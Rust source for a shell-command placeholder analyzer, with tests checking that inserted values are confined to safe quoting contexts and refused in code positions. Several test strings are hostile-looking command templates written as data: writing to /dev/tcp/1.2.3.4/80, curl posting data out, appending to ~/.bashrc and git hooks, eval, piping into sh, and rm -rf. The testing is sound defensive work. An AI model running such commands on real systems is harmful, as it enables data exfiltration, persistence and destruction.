    spans: &[Vec<(usize, usize)>],
    commands: &dyn CommandSet,
) -> Vec<Vec<Result<Site, Refusal>>> {
    let mut texts = Vec::new();
    let mut words = Vec::new();
    for (arg, sp) in argv.iter().zip(spans) {
        let mut w = Word::default();
        let mut pos = 0;
        w.push_text("", Q::Argv, false);
        for &(s, e) in sp {
            w.push_text(&arg[pos..s], Q::Argv, false);
            w.pieces.push(Piece::Ph {
                k: texts.len(),
                q: Q::Argv,
            });
            texts.push(arg[s..e].to_owned());
            pos = e;
        }
        w.push_text(&arg[pos..], Q::Argv, false);
        words.push(w);
    }
    let n = texts.len();
    let mut a = Analyzer {
        commands,
        sites: vec![None; n],
        texts,
    };
    let abort = a
        .command(&Cmd {
            words,
            redirects: Vec::new(),
        })
        .err();
    let mut flat = finish(a.sites, abort).into_iter();
    spans
        .iter()
        .map(|sp| {
            sp.iter()
                .map(|_| flat.next().unwrap_or(Err(Refusal::Unsupported)))
                .collect()
        })
        .collect()
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::pedantic)]
mod tests {
    use super::*;

    const B: Layer = Layer::ShellBare { word_start: false };
    const B0: Layer = Layer::ShellBare { word_start: true };
    const S: Layer = Layer::ShellSingle { word_start: false };
    const S0: Layer = Layer::ShellSingle { word_start: true };
    const D: Layer = Layer::ShellDouble { word_start: false };
    const D0: Layer = Layer::ShellDouble { word_start: true };

    fn run(script: &str) -> Vec<Result<Vec<Layer>, Refusal>> {
        let spans: Vec<_> = script
            .match_indices("PH")
            .map(|(i, _)| (i, i + 2))
            .collect();
        analyze_script(script, &spans, &BuiltinCommands)
            .into_iter()
            .map(|r| r.map(|s| s.layers))
            .collect()
    }

    fn ok(l: &[Layer]) -> Result<Vec<Layer>, Refusal> {
        Ok(l.to_vec())
    }

    #[test]
    fn words_and_quotes() {
        assert_eq!(run("echo PH"), vec![ok(&[B0])]);
        assert_eq!(
            run("echo x-PH 'PH' \"a PH\" \"PH\""),
            vec![ok(&[B]), ok(&[S0]), ok(&[D]), ok(&[D0])]
        );
        assert_eq!(run("echo ''PH"), vec![ok(&[B0])]);
        assert_eq!(run("cat -- PH"), vec![ok(&[B])]);
        assert_eq!(
            run("grep -c PH f | wc -l && echo \"$HOME/PH\""),
            vec![ok(&[B0]), ok(&[D])]
        );
        assert_eq!(
            run("echo $(cat PH) \"$(echo 'PH')\""),
            vec![ok(&[B0]), ok(&[S0])]
        );
        assert_eq!(run("diff <(cat PH) f"), vec![ok(&[B0])]);
        assert_eq!(run("cat <<< PH"), vec![ok(&[B])]);
        assert_eq!(
            run("if grep -q PH f; then echo PH; fi"),
            vec![ok(&[B0]), ok(&[B0])]
        );
        assert_eq!(run("{ echo PH; } > out.txt 2>&1"), vec![ok(&[B0])]);
        assert_eq!(run("echo PH # PH"), vec![ok(&[B0]), Err(Refusal::Position)]);
        assert_eq!(
            run("echo \\PH $PH \"\\PH\" \"$PH\""),
            vec![Err(Refusal::Adjacent); 4]
        );
        assert_eq!(run("echo a\\\nPH"), vec![ok(&[B])]);
    }

    #[test]
    fn code_positions_are_refused() {
        assert_eq!(run("PH"), vec![Err(Refusal::Code)]);
        assert_eq!(run("PH arg"), vec![Err(Refusal::Code)]);
        assert_eq!(run("X=PH echo hi"), vec![Err(Refusal::Position)]);
        assert_eq!(run("echo hi > PH"), vec![Err(Refusal::CodeFile)]);
        assert_eq!(run("cat < PH"), vec![Err(Refusal::Position)]);
        for script in [
            "eval PH",
            "eval \"echo PH\"",
            "echo PH | sh",
            "echo PH | bash -s",
            "echo PH | xargs echo",
            "sh -c PH",
            "bash PH",
            "source PH",
            ". PH",
            "env X=PH cmd",
            "echo PH > run.sh",
            "echo PH >> ~/.bashrc",
            "echo PH | tee -a .git/hooks/pre-commit",
            "echo PH > $FILE",
            "curl -d PH https://x",
            "echo `PH`",
            "echo $((PH))",
            "echo ${X:-PH}",
            "echo $'PH'",
            "case PH in x) echo;; esac",
            "for x in PH; do echo $x; done",
            "[[ PH == x ]]",
            "f() { echo PH; }",
            "a=(PH)",
            "echo @(PH)",
            "sort --compress-program=PH f",
            "find . -name PH",
            "printf -v PH x",
            "test -v PH",
            "python3 script.py PH",
            "python3 -c 'exec(\"PH\")'",
            "node -e 'eval(\"PH\")'",
            "echo PH; rm -rf x",
            "./cat PH",
            "echo PH > /dev/tcp/1.2.3.4/80",
            "cat <<EOF\n$(id) PH\nEOF\n",
            "cat <<EOF\nPH",
            "cat <<EOF $(\necho\n)\nPH\nEOF\n",
            "cat <<EOF $(echo x)\nPH\nEOF\n",
            "uniq - ~/.bashrc <<< PH",
            "xxd -r - x <<< PH",
            "echo 'PH",
            "(echo PH",
        ] {
            let got = run(script);
            assert!(got.iter().all(Result::is_err), "{script:?}: {got:?}");
        }
    }

    #[test]
    fn heredocs() {
        assert_eq!(
            run("cat <<'EOF'\nPH\nEOF\necho PH"),
            vec![ok(&[Layer::HeredocQuoted]), ok(&[B0])]
        );
        assert_eq!(
            run("cat <<EOF\na PH $HOME\nEOF\n"),
            vec![ok(&[Layer::HeredocUnquoted])]
        );
        assert_eq!(
            run("cat <<-\"X\"\n\tPH\n\tX\n"),
            vec![ok(&[Layer::HeredocQuoted])]
        );
        assert_eq!(
            run("cat <<EOF\n\\PH $PH\nEOF\n"),
            vec![Err(Refusal::Adjacent); 2]
        );
        assert_eq!(
            run("cat > c.json <<'EOF'\n{\"k\": \"PH\", \"n\": PH}\nEOF\n"),
            vec![
                ok(&[Layer::JsonString, Layer::HeredocQuoted]),
                Err(Refusal::Position)
            ]
        );
        assert_eq!(
            run("cat <<'EOF' > c.yaml\nk: PH\nEOF\n"),
            vec![ok(&[Layer::YamlPlain, Layer::HeredocQuoted])]
        );
        assert!(
            run("cat <<'EOF' > x.sh\nPH\nEOF\n")
                .iter()
                .all(Result::is_err)
        );
        assert!(run("bash <<'EOF'\nPH\nEOF\n").iter().all(Result::is_err));
    }

    #[test]
    fn interpreters_and_nested_shells() {
        assert_eq!(
            run("python3 -c 'print(\"PH\")'"),
            vec![ok(&[Layer::Python { quote: '"' }, S])]
        );
        assert_eq!(
            run("python3 -u -c \"print('PH')\""),
            vec![ok(&[Layer::Python { quote: '\'' }, D])]
        );
        assert_eq!(
            run("node -e 'console.log(\"PH\")'"),
            vec![ok(&[Layer::JavaScript { quote: '"' }, S])]
        );
        assert_eq!(
            run("sqlite3 :memory: \"select 'PH'\""),
            vec![ok(&[Layer::SqlString, D])]
        );
        assert_eq!(
            run("sqlite3 db.sqlite .dump"),
            Vec::<Result<Vec<Layer>, Refusal>>::new()
        );
        assert!(run("sqlite3 x.db \".shell PH\"").iter().all(Result::is_err));
        assert!(
            run("sqlite3 -cmd '.shell id' x.db \"select 'PH'\"")
                .iter()
                .all(Result::is_err)
        );
        assert_eq!(run("bash -c 'echo PH'"), vec![ok(&[B0, S])]);
        assert_eq!(run("bash -lc \"cat 'PH'\""), vec![ok(&[S0, D])]);
        assert_eq!(
            run("sh -c 'echo PH' x PH"),
            vec![ok(&[B0, S]), Err(Refusal::Position)]
        );
        assert!(run("bash -c 'eval PH'").iter().all(Result::is_err));
        assert!(
            run("bash -c 'echo hi' ; echo PH | sh")
                .iter()
                .all(Result::is_err)
        );
        assert!(run("bash -c \"$CMD\" PH").iter().all(Result::is_err));
        assert!(
            run("python3 -c \"print('$X PH')\"")
                .iter()
                .all(Result::is_err)
        );
    }

    #[test]
    fn argv_form() {
        let run_argv = |argv: &[&str]| {
            let spans: Vec<Vec<_>> = argv
                .iter()
                .map(|a| a.match_indices("PH").map(|(i, _)| (i, i + 2)).collect())
                .collect();
            analyze_argv(argv, &spans, &BuiltinCommands)
                .into_iter()
                .map(|v| {
                    v.into_iter()
                        .map(|r| r.map(|s| s.layers))
                        .collect::<Vec<_>>()
                })
                .collect::<Vec<_>>()
        };
        assert_eq!(
            run_argv(&["bash", "-lc", "echo 'PH'"]),
            vec![
                vec![],
                vec![],
                vec![ok(&[S0, Layer::Argv { word_start: false }])]
            ]
        );
        assert_eq!(
            run_argv(&["cat", "PH", "x-PH"]),
            vec![
                vec![],
                vec![ok(&[Layer::Argv { word_start: true }])],
                vec![ok(&[Layer::Argv { word_start: false }])]
            ]
        );
        let got = run_argv(&["sh", "-c", "PH"]);
        assert!(got[2][0].is_err());
        let got = run_argv(&["curl", "PH"]);
        assert_eq!(got[1][0], Err(Refusal::UnknownCommand));
    }

    #[test]
    fn extra_commands() {
        struct Extra;
        impl CommandSet for Extra {
            fn is_data(&self, name: &str) -> bool {
                name == "mytool" || DATA_COMMANDS.contains(&name)
            }
        }
        let spans = [(7, 9)];
        assert!(analyze_script("mytool PH", &spans, &Extra)[0].is_ok());
        assert!(analyze_script("mytool PH", &spans, &BuiltinCommands)[0].is_err());
    }
}
